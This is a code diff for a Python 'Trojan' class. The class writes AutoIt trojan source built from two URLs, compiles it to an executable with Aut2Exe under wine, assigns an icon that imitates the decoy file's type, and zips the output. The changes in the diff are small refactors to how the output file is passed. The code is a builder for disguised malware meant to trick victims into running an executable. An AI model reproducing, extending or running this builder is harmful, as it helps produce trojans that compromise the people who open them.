@@ -29,11 +29,12 @@ EndFunc   ;==>_GetURLImage
 
 class Trojan:
 
-	def __init__(self, url1, url2, icon):
+	def __init__(self, url1, url2, icon, out_file):
 		self.url1 = url1
 		self.url2 = url2
 		file_type = url1.split(".")[-1].replace("#", "")
 		self.icon = self.set_icon(icon, file_type)
+		self.out_file = out_file
 		
 					
 	def create(self):
@@ -41,14 +42,14 @@ class Trojan:
 		with open(TROJAN_SOURCE_CODE_FILE, "w") as trojan_file:
 			trojan_file.write(urls + trojan_code)
 
-	def compile(self, out_file):
-		subprocess.call('wine "' + AUT2EXE + '" /In "' + TROJAN_SOURCE_CODE_FILE + '" /Out "' + out_file +'" /Icon "' + self.icon + '"' , shell=True)
+	def compile(self):
+		subprocess.call('wine "' + AUT2EXE + '" /In "' + TROJAN_SOURCE_CODE_FILE + '" /Out "' + self.out_file +'" /Icon "' + self.icon + '"' , shell=True)
 	
 	def set_icon(self, icon, file_type):
 		icons_directory = os.path.dirname(os.path.realpath(__file__)) + "/icons"
 		if icon == None:
 			icon = icons_directory + "/" + file_type + ".ico"
-		print(icon)
+
 		if not os.path.isfile(icon) :
 			print("[-] Can't find icon at " + icon)
 			print("[-] Using generaic icon.")
@@ -56,9 +57,9 @@ class Trojan:
 		return icon
 
 	
-	def zip(self, out_file):
-		os.chdir(os.path.dirname(out_file))
-		trojan_name = out_file.split("/")[-1]
-		zip_name = trojan_name.split(".")[0]
+	def zip(self, file_to_zip):
+		os.chdir(os.path.dirname(file_to_zip))
+		trojan_name = file_to_zip.split("/")[-1]
+		zip_name = self.out_file.split("/")[-1].split(".")[0]
 		zipfile.ZipFile(zip_name + ".zip", mode="w").write(trojan_name)
 
